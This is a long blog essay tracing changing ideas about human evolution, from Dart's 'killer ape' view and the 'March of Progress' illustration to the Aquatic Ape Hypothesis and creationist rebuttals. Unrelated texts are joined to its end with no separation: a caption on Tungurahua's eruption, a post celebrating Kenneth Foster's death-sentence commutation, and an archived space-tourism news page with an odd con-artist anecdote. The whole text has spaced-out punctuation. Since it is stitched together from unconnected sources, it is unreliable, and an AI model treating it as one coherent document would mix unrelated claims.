Cope goes on to describe the fossils , noting that the remains DuBois had found do not seem to be of a Neanderthal , and Neanderthals are sufficiently far from humans that Cope finds the scientific name Homo neanderthalensis somewhat objectionable , the more defining characteristics of Neanderthals being found nowhere in the aboriginal peoples then known .
Nowhere does Cope suggest an anagenic relationship of Neanderthals or “ Java Man ” as a direct ancestor , although their utility in showing evolution has occurred is invaluable .
Still , the fossil remains of hominids ( and in turn , their ancestors ) were certainly wanting during Cope ’s time , but in the first half of the 20th century some scientists became to come across some bonanzas in Africa .
Raymond Dart was one of the most noted scientists to study the great fossil - bearing caves from Taung , Sterkfontein , and Makapansgat in South Africa .
In the fantastic book The Hunters of the Hunted ? , C.K.
Brain shares with us this passage of Dart ’s from his early discoveries in the caves ;
The fossil animals slain by the man-apes at Makapansgat were so big that in 1925 I was misled into believing that only human beings of advanced intelligence could have been responsible for such manlike hunting work as the bones revealed …
These Makapansgat protomen , like Nimrod long after them , were might hunters .
They were also callous and brutal .
The most shocking specimen was the fractured lower jaw of a 12 - year - old son of a manlike ape .
The lad had been killed by a violent blow delivered with calculated accuracy on the point of the chin , either by a smashing fist or a club .
The bludgeon blow was so vicious that it had shattered the jaw on both sides of the face and knocked out all the front teeth .
That dramatic specimen impelled me in 1948 and the seven years following to study further their murderous and cannibalistic way of life .
As Brain then notes , such was the murderous Australopithecus of R. A. Dart ; brutal savages and cannibals , making their tools and weapons out of the bones and horns of the animals that they managed to kill .
Examinations of the cave after Dart , however revealed something incredibly different from the terrifying reign of the “ protomen . ”
Humans were , in fact , prey for a long time , many remains attributed to cannibalism instead being signs that the caves once belonged to fearsome predators .
One of the most famous evidences is part of a skull with two puncture holes , nearly exactly matching the canine teeth of a leopard .
Indeed , the real story seems to be a struggle for existence among the hominids found in these areas , not being very advanced in hunting at all .
Nonetheless , they eventually overtook the predators ( when they were n’t stealing from their kills ) , and came to reside in the caves themselves .
Such revelations , however , would have to wait until the 2nd half of the 20th century , and there were plenty more ideas about human origins prior to Brain ’s 1981 book .
Despite the progress of science there have always been “ fringe ” hypotheses about humans and their place in the universe , and perhaps nothing fueled crackpot claims so much as the popularity of UFOs and the possible existence of aliens on Mars during the first half of the 20th century .
Humans became the products of alien engineering projects , bizarre sexual encounters between aliens and early hominids , or even aliens themselves , having no remembrance of coming from a civilization on another planet .
Racist hypotheses also abounded , and there were many odd amalgamations of cherry - picked scientific discoveries and superstition .
While some were content to conjure up ideas of aliens laying down with “ Lucy ” , scientists continued to attempt to determine not only from what ancestors man arose from , but where those ancestors may be .
A.S. Romer , in the 1933 book Man and the Vertebrates Vol. I , supports H.F. Osborn ’s view that man ’s origins were likely to be found somewhere in Asia .
Indeed , the famous 1923 expedition undertaken to the Flaming Cliffs of Mongolia by Roy Chapman Andrews that yielded Protoceratops and so many dinosaur eggs was intended to be a search for the ancestors of humans .
Romer writes ;
The fossil of Tertiary tropical life is , however , still comparatively unknown .
It is not only possible but extremely probable that the Asiatic hills will , upon further exploration , give us the certain knowledge we desire of the primate ancestors of man .
Despite the lack of early ancestors , however , there was enough scientific understanding for Romer to close out the 1st volume with the following words ;
Man has gone far and , we trust , may go still farther along the lines of evolution .
But in his every feature – brain , sense organs , limbs – he is a product of primitive evolutionary trends and owes , in his high estate , much to his arboreal ancestry , to features developed by his Tertiary forefathers for life in the trees .
Romer ’s diagram of human evolution varies from that described by Cope earlier , however .
While Cope saw humans evolving directly from lemur - like ancestors , Romer created a diagram of extant primates ( lemurs , tarsiers , new world monkeys , old world monkeys , great apes , and man ) connected by one line , each of the groups branching off from the main line leading to man and seemingly having no relation to each other .
This is part of the classic model of anagenesis that seems to suggest non -stop progress to man , almost as if a vitalistic force was setting humans on a fast - track ( although I am not suggesting Romer had this view or advocated it ; it merely seems to be an underlying theme in such illustrations ) .
As G.G Simpson noted in the 1950 popular work The Meaning of Evolution , however , contentious fossil remains so close to humans can easily stir up trouble ;
Primate classification has been the diversion of so many students unfamiliar with the classification of other animals that it is , frankly , a mess .
It involves matter of opinion on human origins and , humans being what they are , such opinions are endlessly varied and not always distinguished by competence or logic .
G.G. Simpson ’s tree diagram of primate evolution , from the 3rd edition of The Meaning of Evolution .
Simpson ’s diagram of primate evolution is a bit closer to truth than Romer ’s from nearly 20 years earlier , as well .
It more closely resembled the “ branching bush ” of evolution , groups linked by common ancestors with some lineages dying out and leaving no living descendants .
Still , great apes are distinguished from “ early man ” and the genus Homo , and given that details are not given it ca n’t be ascertained whether Simpson held the view that all hominids discovered by that time were linked in a straight - line of evolution .
Edwin H. Colbert ( also of the American Museum of Natural History ) , put forth a similar view in his popular work Evolution of the Vertebrates , stating ;
Even though human beings may not be descended from the australopithecines as we know them , it is very possible that man arose from australopithecine - like ancestors .
The origin of the human stock probably occurred in late Tertiary times , for man is essentially a Pleistocene animal .
Having become differentiated from his primate relatives , man evolved during the Pleistocene period along certain lines that made him what his is today .
The evolutionary development of human beings was not of great magnitude within the course of Pleistocene history ; rather it was a matter of the perfection of details that set man apart from all other primates , and from all other animals for that matter .
The hominid reconstructions as they appear in Colbert ’s Evolution of the Vertebrates .
This is n’t an especially profound statement , more along the lines of “ Man is different from other animals , thus different things must have happened to cause his ‘ perfection , ' ” but it does point towards the “ ladder ” view of human evolution .
What Colbert is essentially saying is during the latest parts of human evolution , there was a refinement of types rather than major evolutionary change , and while he does n’t line up a point - by - point lineage some of the pictures accompanying his text do suggest a sort of anagenesis from Australopithecus to Pithecanthropus to Neanderthals to Homo sapiens .
Chris Beard , in his indispensable book The Hunt For the Dawn Monkey , attributes this view of human evolutionary “ progress ” to Sir Wilfrid E. Le Gros Clark , quoting Clark ’s work The Antecedents of Man as follows ;
Among the Primates of today , the series tree shrew - lemur - tarsier - monkey - ape - man suggests progressive levels of organization in an actual evolutionary sequence .
And that such a sequence did occur is demonstrated by the fossil series beginning with the early plesiadapids [ so - called “ archaic primates ” from the Paleocene ] and extending through the Palaeocene and Eocene prosimians , and through the cercopithecoid [ Old World monkeys ] and pongid [ apes ]
Primates of the Oligocene , Miocene , and Pliocene , to the hominids of the Pleistocene .
Thus the foundations of evolutionary development which finally culminated in our own species , Homo sapiens , were laid when the first little tree shrew - like creatures advanced beyond the level of the lowly insectivores which lived during the Cretaceous period and embarked on an arboreal career without the restrictions and limitations imposed by … a terrestrial mode of life .
Skeleton of a Potto ( a prosimian like a Loris ) from the American Museum of Natural History
As Beard notes in his book , however , most of the hominid fossils then known were almost like bookends to a series , with the lemur - like ancestors ( i.e. Notharctus from North America and Adapis from France ) of later primates and the famous African and European hominids being the most well known .
As countries became more open to science , however , more and more fossils came out of the ground , and Beard does note that while Africa may very well be the “ cradle of humanity ” in terms of hominids , if you really want to go back to the beginnings of prosimians Asia is the place to search .
This somewhat vindicates those who thought that Asia would be the place to look for human ancestors , though not quite in the way they imagined .
Even so , the ladder view seemed to be the favored one , at least for all fossil hominids younger than the Australopithecus .
In his Vertebrate Paleontology ( 3rd Edition ) , A.S. Romer writes ;
A word may be added here with regard to the nomeclature of human finds .
We have freely used several generic terms for various early human finds .
Such a usage implies that the forms differed widely from one another , had independent evolutionary histories , and did not interbreed – that the differences between them were not merely of species value but of such a magnitude as , for example , those between a cow and an antelope , a dog and a fox .
This is absurd .
Because they are so close to us , we tend to magnify differences .
Actually , the differences between modern man and “ Pithecanthropus ” are , viewed impersonally , rather minor ones ( particularly if we keep in mind the considerable variations found even today ) , and quite surely all types on the human line above the Australopithecus level pertain to our own genus Homo .
Further , while communications between the various Old World area in which man was early present were obviously poor , and there presumably was little interbreeding and consequently ( as today ) a tendency for the differentiation of regional races , it seems fair to assume that throughout our long Pleistocene history , our human ancestors formed at all stages a single , if variable , group .
Despite this rather homogenous view of human evolution ( the idea that Pithecanthropus falls within human variation being an idea that has reared its ugly head in modern creationism , as we ’ll see later ) , Romer does make a distinction when it comes to Neanderthals .
He writes ;
A type of man definitely assignable to our own species , Homo sapiens , appeared in Europe well toward the end of the last glaciation , not more than 50,000 years or so ago .
One would at first assume that he had arisen from his Neanderthal predecessor .
But the contrasts are too great ; there in ( in Europe , at least ) no evidence of transitional types ; the appearance of modern man was , the evidence suggests , relatively sudden .
There is every indication that the “ modernized ” invaders wiped out their predecessors ( Tasmania is a modern parallel ) .
The third part of the original “ March of Progress ” from F. Clark Howell ’s Early Man
Thus , during the 1960 ’s the evolution of man was rather ladder - like as it approached culmination , with relatively little radiation of types .
The links to Australopithecus and Homo neanderthalensis as understood then were both doubted , although it was certain that humans had gone through a similar stage in the evolutionary process from the apes .
Indeed , the ladder - view seemed to use representative types to show the gradation of evolution than linking all known hominids into a straight line ( at least this is the impression from the popular works cited ) .
Still , visual representations of human ancestry seemed far - more powerful than the actual text of many of these books , which brings us to the ( in ) famous “ March of Progress . ”
The artwork , appearing in the 1979 Time - Life book Early Man by F. Clark Howell , certainly became iconic , and I am lucky enough to have a copy of the “ Young Readers Nature Library ” version of the book from my childhood .
The “ march , ” with all members standing upright , carries this caption , and proceeds as follows ;
The stages in man ’s development from an apelike ancestor to the modern human being are shown in drawings on this and the following three pages .
Some of the stages have been drawn on the basis of very little evidence – a few teeth , a jaw or some leg bones .
However , experts can often figure out a great deal about what a whole animal looked like from studying these few remains .
In general , man ’s ancestors have grown taller as they became more advanced .
For purposes of comparison , this chart shows all of them standing although the ones on this page [ Pliopithecus through Oreopithecus ] actually walked on all fours .
Pliopithecus – Proconsul – Dryopithecus – Oreopithecus – Ramapithecus – Australopithecus africanus – Australopithecus robustus – Australopithecus boisei – Homo habilis – Homo erectus – Early Homo sapiens – Neanderthal Man – Cro-Magnon Man – Modern Man
The final part of the original “ March of Progress ” from F. Clark Howell ’s Early Man
Skull of Proconsul from the American Museum of Natural History
The inclusion of “ Early Homo sapiens ” before “ Neanderthal Man ” is a strange one , and even on the following pages australopithecines are shown living during the same time or exhibiting variation .
While the author and artists of the book may not have meant to show that all the primates in their line evolved directly from their predecessors in line , the power of the image overwhelmed any explanation , and the image certainly became iconic .
Evolutionary scientists did not sit idly by while a fallacious notion of human evolution was promulgated , however ; Stephen Jay Gould opens his 1989 book on the Cambrian fauna Wonderful Life with his astonishment that his books , translated into other languages , bear the incorrect image .
Gould writes ;
The march of progress is the canonical representation of evolution – the one picture immediately grasped and viscerally understood by all .
This may best be appreciated by its prominent use in humor and in advertising .
These professions provide our best test of public perceptions .
Jokes and ads most click in the fleeting second that our attention grants them .
…
Life is a copiously branching bush , continually pruned by the grim reaper of extinction , not a ladder of predictable progress .
Most people may know this as a phrase to be uttered , but not as a concept brought into the deep interior of understanding .
Hence we continually make errors inspired by unconscious allegiance to the ladder of progress , even when we explicitly deny such a superannuated view of life .
…
First , in an error that I call “ life ’s little joke ” , we are virtually compelled to the stunning mistake of citing unsuccessful lineages as classic “ textbook cases ” of “ evolution . ”
We do this because we try to extract a single line of advance from the true topology of copious branching .
In this misguided effort , we are inevitably drawn to bushes so near the brink of total annihilation that they retain only one surviving twig .
We then view this twig as the acme of upward achievement , rather than the probable last gasp of richer ancestry .
Gould as absolutely right ; the iconic imagery of the “ March ” is so wrong , yet so easily understood , that it survives even when it is inaccurate .
Creationists use it as a symbol of evolution ( or , more often , mistakes evolutionary scientists have made ) , while satirists often use it to show the “ devolution ” of one group or another , and I doubt that the overall imagery will lose its utility anytime soon .
If nothing else , the lesson we must learn from “ The March of Progress ” is that we are to use the utmost care in selecting visual representations of evolution , for one image can stay in the collective understanding ( or misunderstanding ) of a subject even when it ’s accuracy has long passed the expiration date .
Going back to the thoughts of human evolution during the 60’s and 70’s , the life of earlier hominids was deemed to be a violent one , centering around man as the hunter .
Without the ability to hunt as a group on dangerous African plains , we would n’t have advanced to our current state , requiring plenty of red meat to provide human ancestors more protein for their growing brains ( or so was the logic , anyway ) .
Some people , however , did n’t buy into this view that humans owe everything that evolution bestowed upon them to the Great Hunter , and so a feminist reaction was proposed ; the Aquatic Ape Hypothesis .
Centuries after Anaximander proposed his own views on the aquatic nature of man , Alister Hardy presented a lecture on “ Aquatic Man : Past , Present , and Future ” in 1960 , and soon after he presented the idea to the public in a series of articles for New Scientist magazine .
The Aquatic Ape Hypothesis did not really take off , however , until a writer named Elaine Morgan published the book The Descent of Woman in 1972 .
Hardly a scientific work , the book focused more on a rejection of male - centered anthropology , and Donna Kossy provides an excerpt of Morgan ’s prose in the book Strange Creations ;
She knew at once she was n’t going to like it there .
She had four hands better adapted for gripping than walking and she was n’t very fast on the ground .
She was a fruit eater and as far as she could see there was n’t any fruit …
She never thought of digging for roots – she was n’t very bright .
She got thirsty , too , and the water holes were death traps with large cats lurking hopefully around them .
She got horribly skinny and scruffy - looking .
… The only thing she had going for her was the fact that she was one of a community , so that if they all ran away together a predator would be satisfied with catching the slowest and the rest would survive a little longer .
What then , did she do ?
Did she take a crash course in walking erect , convince some male overnight that he must now be the breadwinner , and back him up by agreeing to go hairless and thus constituting an even more vulnerable and conspicuous target for any passing carnivore ?
Did she turn into the Naked Ape ?
Of course , she did nothing of the kind .
There simply was n’t time .
In the circumstances , there was only one thing she could possibly turn into , and she promptly did it .
She turned into a leopard ’s dinner . …
With piercing squeals of terror she [ a different ancestral ape ] ran straight into the sea .
The carnivore was a species of cat and did n’t like wetting his feet ; and moreover , though he had twice her body weight , she was accustomed like most tree - dwellers to adopting an upright posture , even though she used four legs for locomotion .
She was thus able to go farther into the water than he could without drowning .
She went right in up to her neck and waited there clutching her baby until the cat got fed up with waiting and went back to the grasslands …
… One idle afternoon after a good deal of trial and error she picked up a pebble – this required no luck at all because the beach was covered with thousands of pebbles – and hit one of the shells with it , and the shell cracked .
She tried it again , and it worked every time .
So she became a tool user , and a male watched her and imitated her ( This does n’t mean that she was any smarter than he was – only that necessity is the mother of invention .
Later his necessities , and therefore his inventiveness , outstripped hers . ) …
She began to turn into a naked ape for the same reason as the porpoise turned into a naked cetacean , the hippopotamus into a naked ungulate , the walrus into a naked pinniped , and the manatee into a naked sirenian .
Morgan wrote other books on the subject and there still is a bit of a following to the idea that humans arrived in their current configuration due to an “ aquatic stage ” sometime in their history .
Long hair on the head is for babies to cling to , large breasts float better than small ones , hairlessness makes one more streamlined , and nearly any part of the body that has been adapted this way or that , is potentially explained by life in or around the water , and even recent popular science books have taken a bit of a shine to Morgan ’s hypothesis ( like Survival of the Sickest ) .
Despite the popular appeal , there is not much to the hypothesis , however , and no actual evidence to confirm it , fossil or otherwise .
Indeed , it almost starts with modern female anatomy and works backwards , trying to find an explanation for this trait or that , based upon how we act in the water now , although if we were ever well - adapted to life in the sea we have lost such abilities .
While Morgan was right to criticize the lack of attention given to women in terms of anthropology and evolution , her view is as extreme ( if not moreso ) than the one she was trying to replace .
And now we come to the present .
The evolution of Homo sapiens from older species now extinct has long been established , the evolutionary history of hominids now understood to represent more of a “ bush ” than a ladder of progress .
There are lineages that do show anagenesis or transitions from one species to another , but in the last few decades so many unexpected finds have come out of the ground that imagining human evolution to be a straight - line , deigned to produce us in our present form , is utterly ridiculous .
There are still battles to be fought over which fossil fits where , what kind of dispersal early hominids had , what pressures led to our ancestors being obligate bipeds , but the competing hypotheses in such debates become more and more refined with every discovery , and the evidence supporting the fact that we have evolved cannot be overturned .
This is n’t to say , however , that some trends in understanding ourselves or our ancestry have n’t changed .
As I mentioned earlier , some of the diagrams of human evolution during the first half of the 20th century based themselves on living primates and prosimians , looking to them for the order in which we should place human evolution .
There has been something of a return to this as of late , but in the area of evolutionary psychology rather than paleoanthropology .
Chimpanzees and bonobos , after being confirmed as our closest living relatives , are often used as the two polar archetypes for our own ancestry ; we were either violent like chimpanzees , horny bohemians like bonobos , or something in - between .
While it is often noted that we humans have the ability to do good in spite of our evolutionary past , the authors of Demonic Males make their premise clear ; all living male apes are exceedingly violent ;
This helps explain why humans are cursed with demonic males .
First , why demonic ?
In other words , why are human males given to vicious , lethal aggression ?
Thinking only of war , putting aside for the moment rape and battering and murder , the curse stems from our species ’ own special party - gang traits : coalitionary bonds among males , male dominion over an expandable territory , and variable party size .
The combination of these traits means that killing a neighboring male is usually worthwhile , and can often be done safely .
Frans de Waal , in Our Inner Ape , also recognizes our dark side , but is more of an optimist ; he sees the sexual ( and “ peaceful ” ) culture of bonobos to be proof that violence is not pre-ordained for us .
He writes ;
That such a creature could have been produced through the elimination of unsuccessful genotypes is what lends the Darwinian view its power .
If we avoid confusing this process with its products – the Beethoven error – we see one of the most internally conflicted animals ever to walk the earth .
It is a capable of unbelievable destruction of both its environment and its own kind , yet at the same time it possess wells of empathy and love deeper than ever seen before .
Since this animal has gained dominance over all others , it ’s all the more important that it takes an honest look in the mirror , so that it knows both the archenemy it faces and the ally that stands ready to help it build a better world .
While chimpanzees and bonobos are our closest living relatives , we proceeded on our own line of evolution for at least 4,000,000 years , evolving on an apparently accelerated trajectory while our evolutionary “ cousins ” have not been adapted in exactly the same way .
This is not an appeal to say that humans are so distinct that we should not look to living primates for answers about why we are as we are , but rather that we must also keep the long view in perspective .
Exclusively using the behavior of living apes to work backwards to the behavior of our own ancestors treats the subject as if chimpanzees and bonobos our are ancestors , one of the biggest mistakes still made by people unfamiliar with how evolution works .
Speaking of the “ If we ’re evolved , why are there still monkeys ? ” argument , it is now time to look at modern creationism and its view of human evolution .
As covered at the beginning of this post , the contradictory Genesis accounts tell of humans being created at some point in the past by the Judeo - Christian God , exactly when this event occurred being inferred from chronologies in the Bible .
Still , how could such stories stand up to the weight of scientific evidence for our own evolution ?
The truth of the matter is that it cannot , but that has not stopped some from trying to bring us back to a reliance on Genesis .
The first unsuccessful attempt to debunk human evolution I came across was in Jonathan Wells ’ odious work Icons of Evolution , which bears a scaled - down version of the “ March of Progress ” on its cover .
In the chapter discussing this particular “ icon ” , Wells notes that he is familiar with Gould ’s rejection of the ladder - view of human evolution in Wonderful Life , but this does not seem to be sufficient for Wells .
He engages in the following rhetoric in trying to make his case ;
But how does Gould know that extinctions are accidents ?
On the basis of fossil evidence , how could he possibly know ?
Clearly , it takes more than a pattern in the fossil record to answer sweeping questions about direction and purpose – even if we knew for sure what those patterns are .
And even if extinctions are accidents , does that rule out the possibility that evolution is goal - oriented ?
Everyone ’s death is contingent ; does that make everyone ’s birth and life an accident ?
The continued existence of the human species is contingent on many things :
That we do n’t blow ourselves up with nuclear weapons , that the earth is n’t struck by a large asteroid , and that we do n’t poison our environment , among other things .
But it does n’t follow that our very existence is an accident , or that human life is purposeless .
In this metaphysical muddle Wells offers up no evidence that extinctions have a purpose , that evolution is goal - oriented , or that human life has an inherent “ purpose . ”
Indeed , he acts with such incredulity that he seemingly expects it to be contagious , luring the reader in with a string of absurd questions .
There is no sign of evolution ( or extinction ) occurring as a part of a plan or having an ultimate goal and mind , and even if there was some sort of “ directing force ” to evolution it would seem to be an awfully wasteful process , never ensuring the permanence of a species ( and would evolution , therefore , have an end ? ) .
What Wells essentially does is dress up Gould ’s argument from Wonderful Life as a straw man , and apparently he does n’t realize that Gould beat him to the punch about the famous illustration ( and much more accurately , too ) over a decade before Wells published his own book .
Young Earth Creationist ministries , like the well - known Answers in Genesis , take a slightly different approach ; goading based upon the perceived authority of the Bible .
In his tract The Lie , AiG leader Ken Ham includes cartoon after cartoon of the Bible being set up as the foundation for everything Christians believe , evolution being ( often comically ) set up as the origins of murder , abortion , and all sin .
According to this view , even Old Testament figures like King David fell under the “ evil influence ” of evolution when they committed various sins , even though Darwin would not even be born until centuries later .
The book states ;
Society depends on moral foundations .
By a mutual agreement which has sometimes been called a “ social contract , ” man , in an ordered and civilized society , sets limits to his own conduct .
However , when such obligations are repudiated and the law collapses along with the order it brings , what option has the man who seeks peace ?
The psalmist is looking at the fact that whenever the foundations of society are undermined , then what have good and righteous men done to prevent its impending collapse ?
Indeed , AiG sets the stakes high ; nothing less than the existence of “ civilized ” and moral society rests on the battle being fought over evolution by creationists .
Even those who accept evolution and are Christians are deemed to be compromisers , and generally looked down upon despite shared central theological beliefs .
While the argument that there can be no morality without religion is certainly fallacious , it is a powerful concept , deeply tied to the evangelical desire to “ save ” those who have not accepted Jesus as God .
What is even more surprising , however , is that creationists often state this weakness in their thought process up front ; in the Young Earth Creationist view , nothing can contradict the Bible , and so anything that seems contradictory to accepted doctrine ( which has , of course , been interpreted from the Bible by people ) has to either be shoved into the Bible or dismissed as a lie or hoax .
Case in point ;
AiG ’s new geologist Andrew Snelling once tried to address the lack of human remains intermingled with those of dinosaurs and other fossil creatures from ages past ( they should have been mixed together by the Flood ) by stating that God made sure that no human remains survived the Flood so they would not be worshiped if found by subsequent generations of survivors .
He wrote ;
It would seem to us unloving of God to execute such relentless judgment , but such is God ’s abhorrence of sin that its penalty must be seen for what it is — utter destruction and removal of all trace .
If God can not tolerate sin ( His holiness cannot ‘ look ’ on sin ) , then all trace of sin has to be removed in judgment , which necessitates utter destruction .
Should human remains have been allowed to survive the Flood as fossils , then there could also have been the possibility of such remains being worshiped and revered .
But what about the hominid remains that we do find ?
These are usually said to be “ degenerate ” people dispersed from the Tower of Babel , as God confused the languages of the people trying to build a tower to reach to heaven and dispersed them , feeling excessively threatened by the attempt for some reason ( it is likely that those who wrote the Babel story thought God lived on the firmament in the vault of heaven , a place that actually could be reached if you just built high enough ) .
It has even been argued that if you were to see a Neanderthal today on a subway , you would probably think them a boxer or wrestler , never being the wiser to the fact that you ’re looking at another species .
Generally members of the genus Homo are incorporated into such arguments , with the more basal Australopithecus and Paranthropus being relegated to merely being “ apes . ”
In The Amazing Story of Creation From Science and the Bible , creationist - celebrity Duane Gish writes ;
However , evolutionists ’ faith in their theory makes it necessary for them to believe that a tooth , or a piece of skull , or a jawbone , or some other fossil bone came from a creature partway between ape and man .
When all of the evidence is carefully and thoroughly studied by the best scientific methods , however , it turns out that these fossils were either from monkeys , apes , or people , and not from something that was part ape and part human .
This assertion is importance not only because it shows the YEC need to shoe - horn various hominids into the three categories mentioned above , but also because it involves one of creationism ’s big tricks ; trying to equate science with religion .
If scientists can be said to “ believe ” in evolution , or have “ faith ” that more fossils will be found , then it becomes easy to make it sound like a parallel belief system to Christianity , evolution just being a secular creation myth .
This , of course , is far from the truth , but many are easily drawn into this idea as all religions that are not Christian must therefore be incorrect by definition , once again putting the cart before the horse when considering the natural world .
Young Earth Creationists are n’t the only ones attempting to refute evolution , however .
Hugh Ross is a famous Old Earth Creationist , and his hypotheses are neither here nor there .
Rejecting both evolution and the idea that the earth is less than 10,000 years old , Ross holds that Adam and Eve really were created by God just like the Bible says , only 7,000 to 60,000 years ago .
As for other hominids , Ross puts them in a separate category with other animals , the primarily dividing factor being a lack of a relationship with God .
In The Genesis Question Ross writes ;
Although bipedal , tool - using , large - brained primates roamed Earth for hundreds of thousands ( perhaps a million ) years , religious relics date back only about either thousand to twenty - four thousand years .
Thus , the anthropological date for the first spirit creatures agrees with the biblical date .
Thought most anthropologists still insist that the bipedal primates were “ human , ” the conflict lies more in semantics than in research data .
Support for their views that modern humans descended from these primate species is rapidly eroding .
Evidence now indicated that all bipedal primates went extinct , with the possible exception of Neanderthal , before the advent of human beings .
As for Neanderthal , the possibility of a biological link with humanity has been conclusively ruled out .
Only such Neanderthal / Homo sapiens interactions , however improbable , have n’t been conclusively ruled out .
There are strong arguments from both sides , and at present it does n’t appear that we ’ll be able to come up with a definitive answer .
Still , Ross ’ stance is just as silly as that of the YEC ’s ; he concedes scientific evidence for an old earth and universe , yet evolution is still too much of a detestable idea to be taken seriously .
It ’s not surprising that AiG issued a book , twice the length of Ross ’ original , entitled Refuting Compromise , presenting a point - by - point breakdown of Ross ’ arguments .
All this is a great waste of intellect and paper , but I ’m sure Jonathan Sarfati and Hugh Ross would say the same about what I ’m doing here .
There is still at least one more trick in the creationist toolkit , however ; bringing up past hypotheses that have been refuted or fossil lineages that have been changed and claiming that scientists are either ignorant or liars .
Such is the setup provided to Jonathan Wells by the apologist Lee Strobel , who prides himself on being a “ Devil ’s Advocate ” when he actually presents those he interviews with straw man after straw man .
In the numbingly boring book The Case for a Creator , Strobel concocts a story of how he was convinced that evolution was true because of a reconstruction of “ Java Man ” ( whom we ’ve already met , see above ) , only to have Jonathan Wells crush his childhood memories of Pithecanthropus .
he writes ;
As I leaf back through my time - worn copies of the World Book from my childhood , I can now see how faulty science and Darwinian presuppositions forced my former friend Java man into an evolutionary parade that ’s based much more on imagination than reality .
Unfortunately , he ’s not the only example of that phenomenon , which is rife to the point of rending the record of supposed human evolution totally untrustworthy .
I guess Strobel could n’t be bothered to update himself on evolutionary theory between the time he received his World Book and when he met Wells , and if his “ faith ” in a topic can be so easily manipulated , I wonder why anyone considers him a good apologist .
Still , creationists continue to bring up historical mistakes like “ Nebraska Man ” as if such errors were to strike terror into the hearts of scientists everywhere .
Outside of the outright lies , however , Strobel ’s prose shows us another important side to creationist tactics in trying to undermine evolution ; science is not to be trusted at all .
This strategy , like those mentioned before , works because it appeals to sentiments probably already held by many evangelicals , primarily that the Bible is the source of all truth and holds the answer to every conceivable question , any sort of knowledge or understanding produced by man being inherently flawed and untrustworthy .
The fact that the Bible requires interpretation and that theology is constantly changing , however , does not seem to register , and so the evolution of humans is denied simply because the idea is unsavory .
And that , my friends , bring this post to a close .
Despite the amount of resources I ’ve used from my personal library , this is hardly an exhaustive study ; I have largely ignored major fossil finds in order to focus on the ideas surrounding our own evolution , and any more detail would have greatly prolonged this post .
What I hope to have shown , however , is that science does not crumble when taxa are reassigned or a new fossil shows up where it was not expected ; it only furthers our understanding .
If a hypothesis is shown to be false , then that is one more thing that we now understand to be wrong , therefore improving our knowledge and understanding .
Some will continue to consider this a source of weakness , but as we are not gods , the constant desire to improve our understanding of nature is the best that we can hope for , and the correction of old ideas is what science thrives on .
What would be the alternative ?
To hold on to favored ideas even when they ’ve been proven wrong , hoping that the mere devotion to a notion would make it true ?
Such an idea is far from being unproductive ; it is dangerous .
Fossil finds will continue to be made , the genome will continue to be searched for clues to our evolution , and scientists will continue to ask questions , being both amazed but never satisfied by the latest information as to the history of life on earth .

Tungurahua Erupts
Credit & Copyright : Patrick Taschler
Explanation : Volcano Tungurahua erupted spectacularly last year .
Pictured above , molten rock so hot it glows visibly pours down the sides of the 5,000 - meter high Tungurahua , while a cloud of dark ash is seen being ejected toward the left .
Wispy white clouds flow around the lava - lit peak , while a star - lit sky shines in the distance .
The above image was captured last year as ash fell around the adventurous photographer .
Located in Ecuador , Tungurahua has become active roughly every 90 years since for the last 1,300 years .
Volcano Tungurahua has started erupting again this year and continues erupting at a lower level even today .
The case involves the application of the Texas " law of parties " to Foster , who was 80 feet away from the murder and was not the shooter .
The details of the case , according to the NY Times , are here .
Foster should be spared .
This is the time to email and write to Governor Perry to urge him to spare Foster .
email and FAX to Fax ( 512 ) 463-1849 .
The execution is scheduled for today and will be stopped only if Governor Perry grants the commutation .
Update :
This is a miracle .
Governor Perry has commuted the sentence and spared Foster .
According to The Dallas Morning News :
AUSTIN -- Gov. Rick Perry on Thursday commuted death row inmate Kenneth Foster ’s sentence to life , following a 6 - 1 recommendation by the Texas Board of Pardons and Paroles .
" After carefully considering the facts of this case , along with the recommendations from the Board of Pardons and Paroles , I believe the right and just decision is to commute Foster ’s sentence from the death penalty to life imprisonment , " Gov. Perry said .
" I am concerned about Texas law that allows capital murder defendants to be tried simultaneously , and it is an issue I think the legislature should examine . "
Wow !!
It looks to me like Perry has broadened his stance on commutations with this decision .
And , in fact , he 's saying the legislature should examine the law of parties again .
Unbelievable .
I am astonished .
And I am delighted .
Congratulations go directly to Foster 's legal team .
And now , now that we can all breathe again for a minute , maybe we can abolish the death penalty in its entirety !
Update 2 : speed of the internet : the Pardon and Parole story was on AP at 12:08 ET , the Commutation story was on Morning Nes at 1:08 ET .
Wow !!
Update 3 : I 've been writing about the death penalty for more than 5 years here .
I just want us to mark our calendars on today , because this is really an historical , unimagineably wonderful event .
New Voyage News Circa 2006 - 2007
What was New Voyage News ?
New Voyage News was a site which promoted an age old human dream , to reach beyond our earthly constraints and to launch to space !
To that end , it was a community based site for centralizing news about Space and Space Tourism .
The best stories were voted on by the community thus making the best more visible to all .
The new owner of the site 's domain , a space enthusiast himself , decided to offer some of the original content from the site 's 2006 - 2007 archived pages .
Stephen Wight , the original creator of New Voyage News put so much time and effort into the original site , it would have been a shame to have all of it disappear from the web .
+++
New Voyage News is maintained by Stephen Wight .
Stephen is a life time space enthusiast and general tech geek .
With the Space Tourism industry now becoming a reality , Stephen thought it was time for a community based site where all the news about the Space Tourism industry could be centralized .
Considering how decentralized it is , the best way to accomplish this would be to have the news submitted by other space enthusiasts that have their own sources for keeping up to date .
Stephen 's goal is to bring these enthusiasts all together to a common place to share sources of news and to keep the excitement of this developing industry alive .
NVN hopes to evolve over time to meet the needs of all the users that join the community .

Publisher 's Note : Let the snark begin !
Readers are claiming that information in these pages could provide a way out for someone on the run , who is very wealthy , perhaps a head of failed state , or Donald Trump .
One reader suggests that con artist George Binakis was last seen reading us before vanishing with a large amount of other people 's money .
His most egregious con was of a 72 year old woman in New York who was defrauded of over $ 65,000 .
He posed as a legitimate contractor offering to renovate her luxury condo on Manhattan 's upper west side .
He gained her trust as well as her sympathy by constantly mentioning his serious heart condition , requiring a pacemaker and extensive care .
She was so under George 's spell that when he vanished with her money , her first thought was concern that he died or had a medical emergency .
But it appears that now George has disappeared , perhaps vanished into thin air - on board one of these incredible vehicles .
Place For Retired Astronauts
Published December 8th , 2017
Publisher 's Note : John Glenn wondered about this long ago , but it 's become a recent topic for discussion .
Space writer Mike Potter , whose brother lives in an assisted living facility and relies on the daily care he receives at Hart Heritage in Bel Air MD , has some thoughts on this .
" Once space travel is commonplace and we have colonies on the moon and possibly planets , the needs of the elderly really do n't change , but where they may reside will definitely change .
Retirement communities far from earth will be needed - maybe a Hart Heritage assisted living type of residence on Venus ?
We need to start planning for this before the need arises . "
Astronaut : The Next Generation
